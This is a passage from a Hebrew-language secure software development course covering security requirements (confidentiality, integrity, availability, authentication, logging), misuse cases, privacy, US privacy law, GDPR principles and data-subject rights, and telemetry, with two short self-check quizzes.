אז כיצד ניתן לקבוע את דרישות האבטחה עבור מערכת מסוימת? אחת הדרכים לזהות דרישות אבטחה היא לחשוב על יעדי האבטחה המשותפים ועל פונקציות האבטחה התומכות *שכבר* דנו בהן ולקבוע את הדרישות הספציפיות עבור המערכת שלך בכל קטגוריה. בפרט, חישבו כיצד כל אחד מהם חל על סוג המידע שהתוכנית שלך תנהל. בואו נעבור על כל אחת ממטרות האבטחה ועל פונקציית האבטחה התומכת, ונדון בכמה דברים שיש לקחת בחשבון:

1. **סודיות** ("אין קריאה לא מורשית")<br>
זהו מידע שאין לחשוף בפומבי, כגון מידע פרטי על אנשים ומערכות. למי צריך להיות מותר לראות את המידע? האם ניתן להימנע מלקבל את המידע הזה בכלל (שכן אי אפשר לחשוף את מה שאין לך)? אם מאחסנים פרטי סיסמה כדי שאנשים יוכלו להיכנס למערכת שלך (אימות "נכנס"), עליך לאחסן פרטי סיסמה אלה באמצעות אלגוריתמים מיוחדים המיועדים לכך (כגון Argon2id), כפי שנדון בהמשך.

2. **יושרה (אינגריטי)** ("אין שינוי לא מורשה")<br>
זהה מידע שרק אנשים מסוימים צריכים להיות מורשים לשנות, ומי הם.

3. **זמינות** ("ממשיך לעבוד בנוכחות התקפה")<br>
מה ההשפעה אם התוכנה לא עובדת במשך זמן מה - האם זה רציני? זמינות היא לעתים רחוקות מוחלטת. אם המערכת שלך נגישה דרך האינטרנט, יכול להיות מאתגר מאוד לספק זמינות; תוקף בעל משאבים טובים יכול תמיד להשתמש במתקפת מניעת שירות מבוזרת (DDoS) כדי להפיל אתר, לפחות לזמן מה. ניתן להתמודד עם התקפות DDoS, אבל בסופו של דבר זה יכול להפוך לתחרות בין כמה משאבים יש לכל צד.

גם כאשר לא ניתן להבטיח זמינות באופן מוחלט, עדיין ניתן לקבל תוכנה מאובטחת על ידי התמקדות בפריטים אשר נמצאים בסיכון גדול יותר (לא[ כל התוקפים שווים: הבנה ומניעה של DoS ביישומי אינטרנט, ](https://r2c.dev/blog/2020/understanding-and-preventing-dos-in-web-apps/)מאת Jacob Kaplan-Moss, 2020).  התמקדו בפיתוח התוכנה שלכם כך שלא *יהיה קל* להציף או להוריד אותה עם קלטים פשוטים; תכננו את התוכנה כך שיהיה אפשרי להגדיל באופן זמני את המשאבים על ידי הוספה מהירה של שרתים חדשים; יישמו את התוכנה כך שהיא תתאושש במהירות כאשר המיתקפה מסתיימת. כדי להתמודד עם הסיכון שהמערכת עלולה להיהרס או שהנתונים שלה יימחקו, תכננו את התוכנה כך שהנתונים שלה יגובו בקלות, ותכננו גיבויים. ודאו שניתן לגבות את הנתונים ל"אחסון קר" (שבו לא ניתן יהיה לפגום בנתונים מאוחר יותר אם התוכנה תתערער). אם המערכת מגובה באופן שגרתי, יהיה ניתן להתאושש במהירות יחסית (לפחות באופן חלקי). אם כך, ניתן לקבל זמינות כדרישה, כל עוד המגבלות שלה ברורות.

4. **אי-התכחשות** ("להוכיח שמישהו עשה  משהו")<br>
האם יש פעולה כלשהי שרוצים להיות מסוגלים *להוכיח* שמישהו עשה? במערכות רבות זה לא קריטי, אבל בחלקן זה כן.

5. **זהות ואימות (I&A)**<br>
כיצד יוכיחו המשתמשים מי הם? נרצה לוודא שאין זה אפשרי לזייף משתמש לגיטימי. בדרך כלל עליך לתמוך באימות דו-שלבי (2FA), ישירות או על-ידי מתן אפשרות למשתמשים להוכיח את זהותם באמצעות שירות אחר התומך בכך.

6. **הרשאה**<br>
למי מותר לעשות מה? זהו נדבך מסודיות ויושרת המערכת, אבל אם נחשוב על תפקידי המשתמשים בנוסף למידע שיש להגן עליו, סביר להניח שתתקבל תמונה טובה יותר.

7. **ביקורת/רישום**<br>
איזה מידע/אירועים עליך לתעד? בדרך כלל, לכל הפחות יתועדו כניסה, התנתקות ואירועים חשובים כמו יצירה ומחיקה של חשבון משתמש. בדרך כלל מערכת צריכה לרשום מתי משהו קרה (תאריך ושעה), מה קרה, איזה רכיב מערכת עשה את זה ומי גרם לזה לקרות.

מסמכים משתמשים לרוב במונחי האבטחה "נושא" (subject) ו"אובייקט" (object). "נושא" הוא משהו שפועל (למשל, משתמש או תהליך). "אובייקט" הוא משהו שמופעל עליו (לדוגמה, קובץ או יציאת רשת).

ישנם מפתחים אשר אוספים דרישות מסוימות כ*מקרי שימוש* (use case). כל מקרה שימוש הוא רשימה של אינטראקציות בין המשתמש(ים) לבין המערכת להשגת מטרה. איסוף דרישות באופן שכזה הוביל לגישה אבטחתית מעניינת, שהיא פיתוח של מקרי *התעללות במערכת* או *מקרי שימוש לרעה*. מקרה שימוש של התעללות במערכת הוא רשימה של אינטראקציות בין משתמש(ים) למערכת שנועדו לגרום נזק (למשל, למערכת, למשתמשים אחרים או לבעלי עניין). מונח דומה מאוד הוא "מקרה שימוש לרעה", שהוא תיאור של מעשה זדוני נגד המערכת. ניתן ואף נכון לאפיין מקרי התעללות במערכת או מקרי שימוש לרעה כדי לתאר כיצד על המערכת *להתמודד עם* התעללות/שימוש לרעה כאלה. על ידי חשיבה על התעללות במערכת ושימוש לרעה, והבנה כיצד להתמודד איתם מוקדם, ניתן למנוע נזק רב. מפתחים רבים מתקשים *לחשוב כמו תוקף*, ולכן במהלך קורס זה נתמקד בטכניקות שיעזרו לך למצוא פגיעויות בכל מקרה, למשל, על ידי זיהוי סוגים נפוצים של פגיעויות והסבר כיצד לבצע באופן שיטתי מודלים של איומים.

היבט חשוב בדרישות האבטחה הוא סוג התוקפים שצפוי להתמודד איתם. לדוגמא, קשה מאוד להתמודד עם התקפות ממוקדות של מדינות עתירות משאבים; הידע והיישום הדרושים במקרה זה הם יותר ממה שהקורס הזה יכול לכסות בפני עצמו. עם זאת, לרוב איננו מנסים לפתח מערכות העומדות בהתקפות מסוג זה. בקורס זה, נניח שהתוכנה שלך חייבת לעמוד בפני התקפות שאתר מסחרי טיפוסי עשוי להתמודד איתן, כאשר לתוקף יש משאבים מוגבלים וההתקפות לרוב אינן ממוקדות במיוחד. אם צריך להגן מפני תוקפים עם יותר משאבים מכך, כנראה צריך לעשות הרבה יותר, אבל החומר בקורס זה ייתן לך נקודת התחלה טובה.

שימו לב שבקורס הזה אנחנו מתמקדים בתוקפים, לא בהאקרים. בקהילת המחשבים נעשה שימוש נרחב במונח "האקר" (פצחן) כדי לזהות "*אדם בעל הבנה של פעולתה הפנימית של מערכת מחשבים ורשתות מחשבים בפרט".* ([IETF RFC 1983](https://tools.ietf.org/html/rfc1983)). לפי הגדרה זו, האקרים רבים לעולם אינם תוקפים מערכות מחשב, ותוקפים רבים אינם האקרים. קורס זה מתמקד בסיכול תוקפים.

אם אתם מחפשים רעיונות לדרישות אבטחה פוטנציאליות, מקור אחד לכך הוא [*הקריטריונים הנפוצים להערכת אבטחת טכנולוגיית מידע" (CC) חלק 2*](https://www.commoncriteriaportal.org/), הזמין באופן חופשי. זהו תקן בינלאומי להערכת אבטחה שפותח במקור בשנת 1994. הרוב המכריע של התוכנות שפותחו כיום אינן עוברות את ההערכה (CC), בין השאר משום שלעתים קרובות הערכת CC רשמית של התוכנה שלך, על ידי ספק חיצוני זה גם יקר וגם גוזל זמן רב. עם זאת, עדיין כדאי להסתכל על תקן CC עבור רעיונות גם אם לא תשתמשו בספק חיצוני לטובת הערכה רשמית. ה- CC זמין לציבור וכולל 3 חלקים: חלק 1 הוא מבוא, חלק 2 הוא רשימה של דרישות אבטחה פונקציונליות נפוצות, וחלק 3 הוא רשימה של דרישות אבטחה נפוצות. חלק 2 בפרט הוא רשימה של *"פונקציות אבטחה שעשויים לדרוש".* אם קיים חשד שהמערכת שלך תצטרך דרישות אבטחה מיוחדות, אך אינכם בטוחים מה הן עשויות להיות, חלק 2 מספק רשימה ארוכה של רעיונות שעשויים להיות שימושיים. חלק מהטרמינולוגיה שלו היא ארכאית, אך היא כוללת מילון מונחים שיכול לעזור.

**לבסוף:** אם ישנה תוכנה קיימת שעושה משהו הדומה לתוכנה המפותחת על ידך, מהן יכולות האבטחה שלה? יכולות אלה הוספו מסיבה מסוימת, וייתכן שגם התוכנה שלך זקוקה לפחות לחלק מהן.

#### חידון 1.2: דרישות אבטחה

\>\>דרישה אופיינית עבור שירות המחובר לאינטרנט היא להישאר זמין ללא קשר להתקפות שהוא עובר. אמת או שקר?<<

( ) נכון

(x) לא נכון

[הסבר]

זה לא נכון. זה היה נהדר אם יכולנו להבטיח שכל השירותים המחוברים לאינטרנט יוכלו תמיד להישאר זמינים. אך ברוב המקרים, אם כל מכשיר המחובר לאינטרנט בעולם יבקש שירות מסוים, שירות זה לא יוכל להתמודד עם העומס. כלומר בשלב מסוים, תוקפים בעלי משאבים רבים יכולים בדרך כלל להציף את הזמינות של מגן בעל משאבים מועטים.

כמובן, אנחנו לא צריכים להקל על תוקף להפיל את המערכת. לכן במקום זאת, כל השירותים המחוברים לאינטרנט שאנו בונים צריכים להיות מסוגלים להתמודד עם שיעור בקשות מתון כלשהו, כך שהתוקף צריך לפחות להשתמש במשאבים לא טריוויאליים. באפשרותך לעשות זאת על-ידי תכנון המערכת כך שאפשר יהיה להסתגל במהירות למספרי בקשות גדולים, ושימוש בשירותים אחרים כגון רשתות אספקת תוכן (CDN) כדי להקשיח את המערכת מפני עומסים גדולים. בנוסף, שירות יכול להשתמש בטכניקות כמו התאוששות מהירה, כך שגם אם הוא נפגע על ידי התקפה, הוא יכול להתאושש במהירות כאשר ההתקפה מסתיימת.

[הסבר]

### מהי פרטיות ומדוע היא חשובה

אבטחה ופרטיות קשורות זו בזו, אך אינן זהות. ביחידה זו נסקור מהי פרטיות, את הקשר שלה לאבטחה ומדוע פרטיות חשובה.

#### מה המשמעות של פרטיות?

האיגוד הבינלאומי ללא מטרות רווח [של מומחי פרטיות (IAPP) מגדיר פרטיות](https://iapp.org/about/what-is-privacy/) כ *"הזכות להשתחרר, או חופש מהתערבות או חדירה".* באופן ספציפי יותר, הוא אומר כי *"פרטיות מידע היא הזכות לקבל שליטה מסוימת על האופן שבו המידע האישי שלך נאסף ועל האופן שנעשה בו שימוש... לתרבויות שונות יש דעות שונות לגבי מהן זכויותיו של אדם בכל הנוגע לפרטיות וכיצד יש להסדיר אותן".* הם גם מציגים ניגוד בין פרטיות ואבטחה: *"פרטיות נתונים מתמקדת בשימוש ובפיקוח על נתונים אישיים - דברים כמו קביעת מדיניות כדי להבטיח שהמידע האישי של הצרכנים נאסף, משותף ונעשה בו שימוש בדרכים מתאימות".*

במילים אחרות, פרטיות עוסקת בהגנה על נתונים אישיים של אנשים מפני שימוש לרעה.

#### מדוע פרטיות חשובה?

בעוד שקיימת טענה כי פרטיות כבר אינה אפשרית או רלוונטית, רבים חולקים על כך, וחוקים רבים נקבעו ברחבי העולם כדי להגן על הפרטיות. אחד התקצירים הנגישים לעמדה הרווחת שלפיה פרטיות חשובה הוא הרצאת TED של גלן גרינוולד  "[*מדוע הפרטיות חשובה"*](https://www.ted.com/talks/glenn_greenwald_why_privacy_matters) (2014). הנה כמה מהנקודות שלו (ראו את השיחה לפרטים):

* אנשים שאומרים *"אם אתה עושה משהו שאתה לא רוצה שאנשים אחרים ידעו, אולי אתה לא צריך לעשות את זה מלכתחילה"* עוסקים בזלזול עצמי קיצוני; *"מה שהם בעצם אומרים זה 'הסכמתי להפוך את עצמי לאדם כל כך לא מזיק ולא מעניין, שאני בעצם לא חושש שהממשלה תדע מה אני עושה'".*

* למעשה, רבים מאותם אנשים [שטוענים את הטענות האלה] אינם פועלים בדרך זו, למשל, הם ינקטו צעדים רבים כדי להשיג פרטיות לעצמם.

* *"יש סיבה שישנה השתוקקות לפרטיות באופן אוניברסלי ואינסטינקטיבי... כאשר אנו נמצאים במצב שבו ניתן לפקח עלינו, שבו ניתן לצפות בנו, ההתנהגות שלנו משתנה באופן דרמטי... יש עשרות מחקרים פסיכולוגיים שמוכיחים שכשמישהו יודע שאפשר לצפות בו, התנהגותו הרבה יותר קונפורמיסטית ותואמת".*

* *"מעקב המוני יוצר כלא תודעתי שהוא אמצעי מעודן יותר אם כי הרבה יותר יעיל לטיפוח ציות לנורמות חברתיות או לאורתודוקסיה חברתית,יעיל יותר ממה שכוח הזרוע יכול להיות אי פעם".*

* *"חברה שבה ניתן לפקח על אנשים בכל עת היא חברה שמגדלת קונפורמיות וציות וכניעה, ולכן כל עריץ, הגלוי ביותר עד המעודן ביותר, משתוקק למערכת כזו".*

* *"כשאנחנו מאפשרים לחברה שבה אנחנו נתונים לניטור מתמיד להתקיים, אנחנו מאפשרים למהות החופש האנושי להיפגע קשות".*

* *"מערכת של מעקב המוני מדכאת את החופש שלנו בכל מיני דרכים. היא מוציאה בחירות התנהגותיות מסוימות אל מחוץ לתחום מבלי שאנחנו אפילו יודעים שזה קרה".*

### דרישות פרטיות

#### הגישה הפשוטה ביותר: אל תאסוף מידע אישי

הצעד הראשון לטיפול בפרטיות הוא הכרה בכך שפרטיות היא חשובה, ולאחר מכן יש לשקול כיצד להבטיח שהתוכנה שלך מספקת פרטיות מספקת אם היא אוספת מידע על אנשים.

הגישה הפשוטה ביותר לפרטיות, ולעתים קרובות נקודת ההתחלה הטובה ביותר, היא *לא* לאסוף מידע על אנשים אלא אם כן יש בו צורך. אם אין איסוף מידע, אין אפשרות לחשוף אותו מאוחר יותר, ואין צורך לקבוע כיצד למנוע שימוש לרעה בו. מנקודת מבט של פרטיות, ביטול זה הוא הטוב ביותר .

אם לא תצליחו בכך, צמצמו את המידע האישי למה שדרוש בהחלט. אם חייבים לאסוף מידע על אנשים, עליך לספק להם מגוון הגנות, לכל הפחות אלה הנדרשות על פי החוק והרגולציה. מכיון שחוקים ותקנות רבים עשויים לחול, זה עלול להיות מסובך.

#### חוקים ותקנות בנושא פרטיות

חוקים ותקנות הנוגעים לפרטיות נפוצים ומונחים שונים משמשים עבורם, כולל פרטיות מידע, פרטיות נתונים והגנה על נתונים. השאלה אם חוקים ותקנות אלה משפיעים על התוכנה שלך או לא, תלויה בסוג הנתונים שהתוכנה שלך אוספת. במקרים רבים, תוכנה לא צריכה לעשות שום דבר מיוחד עבור פרטיות. עם זאת, במקרים אחרים חוקים ותקנות אלה יכולים להיות חשובים מאוד.

[סעיף 17 לאמנה הבינלאומית לזכויות אזרחיות ומדיניות של האומות המאוחדות](https://www.ohchr.org/en/professionalinterest/pages/ccpr.aspx) משנת 1966 אושרר באופן נרחב ומגן על הפרטיות. האמנה קובעת כי *"לא יהיה אדם נתון להתערבות שרירותית או בלתי חוקית בפרטיותו, במשפחתו, בביתו או בתכתובתו, ולא להתקפות בלתי חוקיות על כבודו ועל שמו הטוב. כל אדם זכאי להגנה של החוק מפני התערבות או מפני התקפות כאלה".*

למדינות שונות, ולמחוזות/מדינות בתוך מדינות, יש חוקים שונים בנוגע לפרטיות. נדון בקצרה בגישות של ארה"ב ואירופה.

#### ארצות הברית

בארצות הברית (ארה"ב) אין חוק פרטיות מידע כולל ומקיף. במקום זאת, לממשל הפדרלי בארה"ב יש מספר חוקים המכסים נסיבות ספציפיות. לדוגמא, חוק הזכויות החינוכיות המשפחתיות והפרטיות של 1974 (FERPA) עבור רשומות חינוך של תלמידים, חוק הניידות והאחריות של ביטוח בריאות משנת 1996 (HIPAA) עבור נתונים הקשורים לבריאות, חוק הגנת הפרטיות המקוונת של ילדים משנת 1998 (COPPA) עבור נתונים הקשורים לילדים, וחוק עסקאות אשראי הוגנות ומדויקות משנת 2003 (FACTA) עבור נתונים פיננסיים מסוימים.

 [חוק הפרטיות של ארה"ב משנת 1974 (5 U.S.C. 552a)](https://www.govinfo.gov/content/pkg/USCODE-2018-title5/pdf/USCODE-2018-title5-partI-chap5-subchapII-sec552a.pdf) מציין כיצד סוכנויות פדרליות בארה"ב חייבות לשמור רשומות על אנשים שהם אזרחי ארה"ב וזרים תושבי קבע. לדוגמה, הם חייבים:

* לאסוף רק מידע הכרחי הרלוונטי והנחוץ לביצוע תפקיד סוכנות;

* להסביר בזמן איסוף המידע, מדוע הוא נחוץ וכיצד ייעשה בו שימוש;

* לוודא שהרשומות משמשות רק את הסיבות שניתנו, או לבקש את רשותו של האדם כאשר מטרה אחרת לשימוש ברשומות נחוצה או רצויה;

* לספק אמצעי הגנה נאותים כדי להגן על הרשומות מפני גישה וגילוי בלתי מורשים;

* לאפשר לאנשים לראות את הרשומות שנשמרו עליהם ולאפשר להם את ההזדמנות לתקן אי דיוקים ברשומות שלהם.

בחלק ממדינות ארה"ב יש חוקים נוספים. לדוגמה, [חוק הגנת הפרטיות המקוונת של קליפורניה (OPPA) משנת 2003](https://leginfo.legislature.ca.gov/faces/codes_displaySection.xhtml?lawCode=BPC&sectionNum=22575) מחייב מפעילים של אתרי אינטרנט מסחריים או שירותים מקוונים *"שאוספים מידע המאפשר זיהוי אישי באמצעות האינטרנט על צרכנים בודדים המתגוררים בקליפורניה המשתמשים או מבקרים בה [האתר או השירות חייבים] באופן בולט לפרסם את מדיניות הפרטיות שלה... ולציית לה״*. לאחרונה, [חוק פרטיות הצרכן של קליפורניה משנת 2018 (CCPA),](https://leginfo.legislature.ca.gov/faces/codes_displayText.xhtml?division=3.&part=4.&lawCode=CIV&title=1.81.5) שנכנס לתוקף בשנת 2020, מעניק לתושבי קליפורניה זכויות נוספות לדעת איזה מידע אישי נאסף על ידי עסקים, ולבטל את הסכמתם למכירת מידע זה.

באירופה *קיים* חוק מקיף, וגם מי שנמצא מחוץ לאירופה חייבים לעתים קרובות לציית לו. בואו נתמקד בחוק זה מכיון שהוא חל על מצבים רבים, והבנתו תעזור לך להבין דרישות פרטיות אחרות.

#### התקנה האירופית הכללית להגנה על נתונים (GDPR)

התקנה האירופית הכללית להגנה על נתונים (GDPR) מגנה על הנתונים האישיים של נושאים הנמצאים באיחוד האירופי (EU). הוא חל בין אם עיבוד הנתונים מתרחש בתוך האיחוד האירופי ובין אם לאו, והוא חל בין אם הנבדקים הם אזרחים אירופאים ובין אם לאו. כתוצאה מכך, ה-GDPR חל בנסיבות רבות. [לקרן לינוקס יש סיכום של ה-GDPR](https://www.linuxfoundation.org/wp-content/uploads/2018/05/lf_gdpr_052418.pdf) שמדגיש נושאים חשובים למפתחי ומפתחות תוכנה. להלן נצביע על כמה יסודות GDPR מתוך סיכום ה- GDPR של קרן לינוקס.

אבל ראשית: ציות ל-GDPR הוא חשוב. הפרות חמורות עלולות לגרור קנס של עד 20 מיליון אירו, או 4% מההכנסות השנתיות העולמיות של חברה משנת הכספים הקודמת, לפי הגבוה מביניהם**.

ה-GDPR מגדיר נתונים אישיים (הדורשים הגנה ככאלה) כ *"כל מידע הקשור לאדם טבעי מזוהה או הניתן לזיהוי ('נושא הנתונים'); אדם טבעי הניתן לזיהוי הוא אדם שניתן לזהותו, במישרין או בעקיפין, במיוחד על ידי התייחסות למזהה כגון שם, מספר זיהוי, נתוני מיקום, מזהה מקוון או לגורם אחד או יותר הספציפיים לזהות הפיזית, הפיזיולוגית, הגנטית, הנפשית, הכלכלית, התרבותית או החברתית של אותו אדם טבעי"* . שים לב שלא רק נתונים מזהים אדם - אלא גם נתונים המחוברים לנתונים המזהים אדם. לדוגמה, כתובת הדואר של אדם היא נתונים אישיים; פרטים על כישוריו או העדפותיו של אדם הם גם נתונים אישיים אם הם מקושרים, או מסוגלים באופן סביר להיות מקושרים, למידע אחר המזהה את אותו אדם.

במסגרת ה-GDPR חלק מהנתונים האישיים נחשבים לרגישים יותר, ויש הגבלות רבות יותר על איסוף ועיבוד שלהם. אלה כוללים:

* מוצא גזעי או אתני

* דעות פוליטיות, אמונות דתיות או פילוסופיות, או חברות באיגודים מקצועיים

* נתונים גנטיים

* נתונים ביומטריים לצורך זיהוי ייחודי של אדם טבעי

* נתונים הנוגעים לבריאות

* נתונים הנוגעים לחיי המין או לנטייה המינית של אדם טבעי

נתונים אישיים *מעובדים* בכל פעם שמתבצעת בהם פעולה. זה כולל איסוף, אחסון, הצגה, שידור ומחיקה שלהם, בין אם באמצעים אוטומטיים ובין אם לאו. ב- GDPR, "בקר" (קונטרולר) הוא האדם או הארגון שקובע את מטרת ואמצעי העיבוד. "מעבד" (פרוססור) הוא צד שלישי המעבד את הנתונים בשמו של בקר.

ה-GDPR מגדיר שבעה עקרונות עיקריים לעיבוד נתונים אישיים. עקרונות אלה קובעים את המטרות של כל ההוראות הספציפיות של ה-GDPR. הבנתם תורמת רבות לתובנה ראשונית טובה לגבי השאלה אם שימוש מסוים בנתונים אישיים עשוי להיות מקובל. אלה הם:

1. **חוקיות, הגינות ושקיפות**<br>עיבוד נתונים אישיים באופן חוקי, הוגן ושקוף לנושא הנתונים.

2. **הגבלת מטרה**<br>עיבוד נתונים אישיים רק בדרכים התואמות את המטרות הלגיטימיות שלשמן הם נאספו.

3. **מזעור נתונים**<br>הגבלת הנתונים האישיים שנאספים למען קיום מטרות אלה בלבד.

4. **דיוק**<br>שמירה על נתונים אישיים מדויקים ומעודכנים, ונקיטת כל צעד סביר כדי למחוק או לתקן נתונים לא מדויקים.

5. **הגבלת אחסון**<br>אחסון נתונים אישיים בצורה המאפשרת זיהוי שאינו מעבר לנדרש למטרות שלשמן הם נאספו.

6. **יושרה וסודיות**<br>עיבוד נתונים אישיים באופן מאובטח דיו.

7. **אחריות**<br>בקר של נתונים אישיים אחראי לעקרונות שלעיל, ולהוכחת עמידתו בהם.

שישה סעיפים ב-GDPR מפרטים זכויות ספציפיות הניתנות לאנשים בנוגע לנתונים האישיים שלהם. באופן זה ניתנת לתושבי האיחוד האירופי הזכות ליצור קשר עם בקר נתונים ולבקש ממנו לבצע פעולות מסוימות (*בקשות GDPR*). מכיוון שלתושבי האיחוד האירופי עומדות זכויות אלה, יש לתכנן מערכות תוכנה ותהליכים ארגוניים כדי לאפשר אותן. סוגי הבקשות המתוארים ב- GDPR כוללות את:

* **זכות גישה** (סעיף 15)<br>נושאי נתונים יכולים לבקש לדעת האם הנתונים האישיים שלהם מעובדים. אם כן, הם יכולים לקבל "גישה" לנתונים (למשל, עותק או צילום מסך שלהם) ומידע בנוגע לעיבוד.

* **הזכות לתיקון** (סעיף 16)<br>נושאי הנתונים יכולים לעדכן ולתקן נתונים לא מדויקים.

* **הזכות למחיקה** ("הזכות להישכח") (סעיף 17)<br>בנסיבות מסוימות, נושאי הנתונים יכולים למחוק את הנתונים האישיים שלהם.

* **הזכות להגבלת העיבוד** (סעיף 18)<br>בנסיבות מסוימות, נושאי הנתונים יכולים להגביל את עיבוד הנתונים האישיים שלהם. עדיין ניתן לאחסן אותו, אלא אם כן הוגשה גם בקשה ל"זכות למחיקה".

* **הזכות לניידות נתונים (**סעיף 20)<br>בנסיבות מסוימות, נושאי הנתונים יכולים לייצא את הנתונים האישיים שלהם (לדוגמה, על ידי הנגשתם  לנושא הנתונים או לצד שלישי בפורמט מובנה, נפוץ וקריא על ידי מכונה).

* **הזכות לאובייקט** (סעיף 21)<br>בנסיבות מסוימות, במיוחד למטרות שיווק ישיר ויצירת פרופיל, נושאי נתונים יכולים להתנגד לעיבוד הנתונים האישיים שלהם.

כדי לעבד נתונים אישיים, אותם נתונים חייבים להיות חוקיים, כלומר עליהם ליפול לפחות לאחת מכמה קטגוריות, כולל בין היתר את הקטגוריות הבאות:

* **ציות לחוק**. ניתן לעבד נתונים אישיים אם הדבר נחוץ לצורך עמידה בחובה חוקית.

* **התקשרות בחוזה עם נושא הנתונים**. ניתן לעבד נתונים אישיים אם יש צורך להתקשר בחוזה עם אותו נושא נתונים. *שים לב שסביר להניח שסעיף זה אינו חל על חוזה עם מישהו אחר מלבד נושא הנתונים, כגון המעסיק שלהם.*

* **אינטרסים עסקיים לגיטימיים**. ניתן לעבד נתונים אישיים אם הדבר עולה בקנה אחד עם "אינטרסים לגיטימיים", אלא אם כן האינטרסים של הנבדק גוברים עליהם. סעיף זה יכול להיות מעורפל לעיתים.

* **הסכמה**. ניתן לעבד נתונים אישיים אם נושא הנתונים נותן את הסכמתו.

שים לב שניתן לעבד נתונים אישיים אם נושא הנתונים נותן את הסכמתו. עם זאת, כדי שההסכמה תהיה תקפה במסגרת ה-GDPR:

* עליו להיות *"ספציפי"* ו *"מעודכן"* (למשל, עליו לכלול תיאור ספציפי של הנתונים הנאספים, וכיצד ייעשה בהם שימוש);

* היא דורשת *"העדפה חיובית ברורה"* על ידי נושא הנתונים (למשל, דרישה מהמשתתף לסמן תיבת סימון, ולא לבדוק אותה מראש); וכן

* הוא חייב להיות ניתן לביטול באופן חופשי (לדוגמה, הנבדק חייב להיות מסוגל לבטל את הסכמתו בכל עת).

גם אם תינתן הסכמה, כדאי למצוא בסיס חוקי נוסף לעיבוד הנתונים, במיוחד אם ברצונך לשמור אותם. על פי ה-GDPR, בדרך כלל נאסר עליך לשמור נתונים אישיים ללא בסיס חוקי.

במסגרת ה-GDPR, *(פרופיילינג) יצירת פרופילים* היא כל צורה של עיבוד אוטומטי הכוללת שימוש בנתונים אישיים כדי להעריך היבטים של אותו אדם. יצירת פרופיל תדרוש בדרך כלל קבלת הסכמה מפורשת מהאדם, כלומר שהאדם גם יוכל לבטל הסכמה זו בכל עת. לכן, פעילויות יצירת פרופילים ידרשו בדרך כלל מידה רבה יותר של סקירה והגנות עבור הנתונים האישיים הרלוונטיים.

הנה כמה משאבים לקבלת מידע נוסף על GDPR:

*  [האתר הרשמי של האיחוד האירופי עבור GDPR](http://data.europa.eu/eli/reg/2016/679/oj)

* [*"המדריך לתקנה הכללית להגנה על נתונים (GDPR)"*](https://ico.org.uk/for-organisations/guide-to-data-protection/guide-to-the-general-data-protection-regulation-gdpr/)

* [*"פתרונות לשימוש אחראי בבלוקצ'יין בהקשר של נתונים אישיים"*](https://www.cnil.fr/sites/default/files/atoms/files/blockchain_en.pdf)

* [*"אבטחת נתונים אישיים"*](https://www.cnil.fr/sites/default/files/atoms/files/cnil_guide_securite_personnelle_gb_web.pdf)

* קרן לינוקס, [* "סיכום מושגי GDPR לפרויקטים של תוכנה חופשית וקוד פתוח"*](https://www.linuxfoundation.org/wp-content/uploads/2018/05/lf_gdpr_052418.pdf)

* [חוק הגנת הפרטיות המקוונת של קליפורניה, פרק 22. דרישות פרטיות באינטרנט [22575-22579]](https://leginfo.legislature.ca.gov/faces/codes_displaySection.xhtml?lawCode=BPC&sectionNum=22575)

#### טלמטריה

תוכנה כוללת לעתים פונקציונליות לאיסוף נתוני מדידת שימוש, כלומר, נתונים על אופן השימוש או הביצועים של התוכנה. נתוני טלמטריה נאספים לעתים קרובות באמצעות מנגנון "התקשר הביתה" המובנה בתוכנה עצמה, שבו התוכנה שולחת נתונים אלה למקום אחר.

נתוני טלמטריה כרוכים במיוחד בבעיות פרטיות וסודיות. למשתמשי קצה מוצגת בדרך כלל אפשרות להצטרף לשיתוף נתונים סטטיסטיים עם מפתחי התוכנה, אך ייתכן שהסכם זה אינו מספיק. באופן אידיאלי, יש לתת למשתמשי הקצה מודעות מלאה לאילו נתונים עשויים להישלח לאילו גורמים (כולל הספק) כאשר הם משתמשים בתוכנה, וליכולת לשלוט בהעברת נתונים זו.

"מדיניות איסוף ושימוש בנתוני טלמטריה"[* של קרן לינוקס *](https://www.linuxfoundation.org/telemetry-data-policy/) מציגה דיון קצר בכמה מהנושאים שיש לקחת בחשבון לפני יישום איסוף נתוני טלמטריה, כמו גם דיון בגישת הקרן לניהול השימוש בטלמטריה על ידי קהילות פרויקט הקוד הפתוח שלה. מדיניות זו עשויה להיות שימושית עבורך בהקשרים אחרים.

#### חידון 1.3: דרישות פרטיות

\>\>איזו מההצהרות הבאות הקשורות לפרטיות נכונה?|| יש לסמן את כל האפשרויות הנכונות.<<

[!] אין חוקי פרטיות בארצות הברית. {{ נבחר: לא. בארצות הברית אין חוק פרטיות מידע **מקיף בכללותו**. במקום זאת, לממשל הפדרלי בארה"ב יש מספר חוקים המכסים נסיבות ספציפיות שונות. יש גם כמה חוקי מדינה. }}

[ ] ה-GDPR אינו רלוונטי כל עוד אתה מעבד נתונים אישיים מחוץ לאירופה. {{ נבחר: לא. תקנת GDPR חלה על מי שמעבד נתונים אישיים של המתגוררים באירופה, בין אם הנתונים מעובדים באירופה ובין אם לאו. אי ציות ל- GDPR עשוי להיות ניתן לאכיפה או לא, בהתאם למגוון גורמים, אך במקרים רבים הוא רלוונטי מאוד. }}

[x] במסגרת ה-GDPR, נתונים אישיים מסוימים נחשבים לרגישים יותר, ויש הגבלות רבות יותר על איסוף ועיבוד שלהם. זה כולל דעות פוליטיות, אמונות דתיות או פילוסופיות, חברות באיגודים מקצועיים, נתונים גנטיים ונתונים הנוגעים לבריאות.

[ ] על פי ה-GDPR, ברגע שניתנת הסכמה לא ניתן לבטל אותה. {{ נבחר: לא, ה-GDPR דורש שמשתמשים יוכלו לבטל את הסכמתם. אם אין סיבה משפטית אחרת שניתן לשמור ולעבד את הנתונים, יש למחוק את הנתונים. }}

[ ] במסגרת ה-GDPR, תיבת סימון "אני מסכים" מסומנת מראש מספיקה כדי לקבל הסכמה. {{ נבחר: לא, הסכמה דורשת "העדפה חיובית ברורה". תיבות מסומנות מראש אינן נחשבות. }}

[x] במסגרת ה-GDPR, נושאי נתונים יכולים, בנסיבות מסוימות, לדרוש למחוק את הנתונים האישיים שלהם.

## איך נגיע לשם?

### ניהול סיכונים

סיכונים הם *בעיות פוטנציאליות*. המפתח לפיתוח תוכנה מאובטחת כראוי הוא לנהל את הסיכונים של פיתוח תוכנה לא מאובטחת, *לפני* שהם הופכים לבעיות.

#### הצורך בניהול סיכונים

